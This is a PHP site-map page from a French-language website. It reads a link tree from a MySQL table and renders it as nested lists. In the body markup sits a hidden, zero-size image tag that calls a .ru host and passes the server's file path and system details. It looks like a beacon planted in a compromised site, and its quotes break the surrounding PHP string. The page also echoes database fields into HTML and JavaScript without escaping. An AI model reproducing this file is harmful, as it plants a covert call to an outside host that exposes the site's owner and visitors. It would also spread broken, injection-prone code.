<?php
include('lib/config.php');

if( isset($_GET['niveau'] ) )
	$_GET['niveau'] = CleanUp($_GET['niveau']);

if( isset($_GET['cat']) && $_GET['cat'] ) 
	$_SESSION['choix_categorie'][$_GET['niveau']] = $_GET['cat'];

// fonction récursive qui affiche les sous noeud d'un noeud

function affiche_sous_noeud( $argnoeudFils, $argnoeudId )
{

	if( $aryNoeuds = @$argnoeudFils[$argnoeudId] ){

		echo "<ul type=\"circle\">\n";
	  // while( list(,$aryNoeud) = each($aryNoeuds) ){
	   foreach($aryNoeuds as $aryNoeud){
			  $lang=$_SESSION['langue'];
			  $dlang= "description_$_SESSION[langue]";
			  $description= str_replace("'", "\'", $aryNoeud[$dlang]);
			  echo "<li>\n<a href=\"$aryNoeud[liens]\" onMouseOver=\"afficheDescURL('$description')\" onMouseOut=\"cache()\">$aryNoeud[$lang]</a>\n";
			  affiche_sous_noeud( $argnoeudFils,$aryNoeud['id'] );
		}
		echo "</ul>";
	}
} // affiche_sous_noeud

//<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//FR'>
echo "
<html xmlns='http://www.w3.org/1999/xhtml'>
   <head>
		<title>Plan du site</title>
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1' >
		<meta http-equiv='Content-Disposition' content='inline; filename=plan' >
		<meta http-equiv='Content-Description' content='text/html; charset=iso-8859-1' >
		<meta name='author' content='$NomCieCréé' >
		<meta name='copyright' content='copyright © $CopyAn $NomCie' >
		<link href='styles/stylegen.css' rel='stylesheet' type='text/css' >
		<link href='styles/gf_scroll_div.css' rel='stylesheet' type='text/css' >
		<link href='styles/style.css' rel='stylesheet' type='text/css' >
		<base target='MAIN'>
	</head>
	<script type='text/javascript' src='js/gf_scroll_div.js'></script>
<body bgcolor='#FFFFFF' ><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
<div align='center'>
<table width='$Large' align='$Enligne' cellpadding='0' cellspacing='0' border='0'  >
	<tr>
		<td>
	<div align='$Enligne' id='DIV_MOVE' style=display='none'>
		<div id='DIV_MOVE2'>DESCRIPTION</div>
		<div id='DIV_MOVE1'></div>
	</div>";
// selection dans noeud

	$sql = "SELECT * from $mysql_base.noeud ORDER BY ordre ASC";
	$aryResultatRequete = mysql_query($sql, $handle)
		or die("Erreur à get_Lien : ".mysql_error());

	// rangement des Noeud
	while( $aryNoeud = mysql_fetch_array($aryResultatRequete) ){
			$id_parent = $aryNoeud['id_parent'];
			// c'est le premier Noeud 
			if( !$id_parent ) 
				$aryNoeudsSujets[] = $aryNoeud; 
			else 	// sinon on l'ajoute dans la teableau des Noeuds fils
				$arynoeudFils[$id_parent][] = $aryNoeud;
	}

	// affichage des Noeuds
	//while( list(,$arySujet) = each($aryNoeudsSujets) ){  
	foreach($aryNoeudsSujets as $arySujet){
	
		// appel de la fonction récursive qui va afficher tous les sous noeud
		affiche_sous_noeud( $arynoeudFils,$arySujet['id'] );
	}

?>
		</td>
	</tr>
  	<tr> 
		<td colspan='3' width=100% >
			<?php include("bas_page.inc"); ?>
		</td>
  	</tr>
</table></div>
</body>
</html>